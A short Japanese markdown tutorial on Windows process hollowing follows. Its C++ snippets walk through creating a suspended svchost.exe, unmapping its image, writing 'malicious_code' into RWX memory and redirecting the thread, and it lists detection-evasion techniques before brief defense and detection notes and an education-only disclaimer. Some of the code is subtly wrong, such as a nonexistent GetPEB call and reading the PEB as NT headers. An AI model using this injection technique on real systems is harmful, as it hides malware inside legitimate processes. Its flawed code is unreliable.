# Process Hollowing Techniques

**対応OS**: Windows

## 概要
プロセスホローイングは、正規のプロセスのメモリ空間を悪意のあるコードで置き換える手法です。

## 基本的な手順

### 1. プロセス作成
```cpp
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA(NULL, "svchost.exe", NULL, NULL, FALSE, 
    CREATE_SUSPENDED, NULL, NULL, &si, &pi);
```

### 2. メモリ解放
```cpp
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);
LPVOID peb = GetPEB(pi.hProcess, ctx);
IMAGE_NT_HEADERS nt_headers;
ReadProcessMemory(pi.hProcess, peb, &nt_headers, sizeof(nt_headers), NULL);
NtUnmapViewOfSection(pi.hProcess, nt_headers.OptionalHeader.ImageBase);
```

### 3. 新しいコードの注入
```cpp
LPVOID new_base = VirtualAllocEx(pi.hProcess, 
    (LPVOID)nt_headers.OptionalHeader.ImageBase,
    nt_headers.OptionalHeader.SizeOfImage,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

WriteProcessMemory(pi.hProcess, new_base, 
    malicious_code, code_size, NULL);
```

### 4. エントリーポイントの設定
```cpp
ctx.Eax = (DWORD)((LPBYTE)new_base + 
    nt_headers.OptionalHeader.AddressOfEntryPoint);
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

## 検知回避テクニック
- 正規プロセスの選択
- メモリパターンの偽装
- タイミング制御
- アンチデバッグ

## 防御策
- プロセスの整合性監視
- メモリ領域の保護
- 不審なプロセス作成の検知
- ホワイトリスト化

## 検知方法
- メモリマッピングの変更検知
- プロセスの挙動分析
- APIコール監視
- メモリダンプ分析

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 